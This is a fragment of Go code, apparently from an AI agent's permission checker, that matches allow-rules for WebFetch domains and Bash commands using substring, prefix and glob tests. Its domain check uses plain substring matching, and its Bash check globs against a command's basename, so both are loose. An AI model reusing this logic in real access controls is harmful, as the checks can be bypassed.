	// Handle domain: prefix for WebFetch.
	if strings.HasPrefix(pattern, "domain:") {
		domain := strings.TrimPrefix(pattern, "domain:")
		return strings.Contains(value, domain)
	}

	// Handle :* prefix matching.
	if strings.HasSuffix(pattern, ":*") {
		prefix := strings.TrimSuffix(pattern, ":*")
		return strings.HasPrefix(value, prefix)
	}

	// Try doublestar glob matching first (supports **).
	matched, err := doublestar.Match(pattern, value)
	if err == nil && matched {
		return true
	}

	// For Bash commands, also try prefix matching with glob.
	// "npm run *" should match "npm run test" etc.
	matched, err = doublestar.Match(pattern, filepath.Base(value))
	if err == nil && matched {
		return true
	}

	return false
}
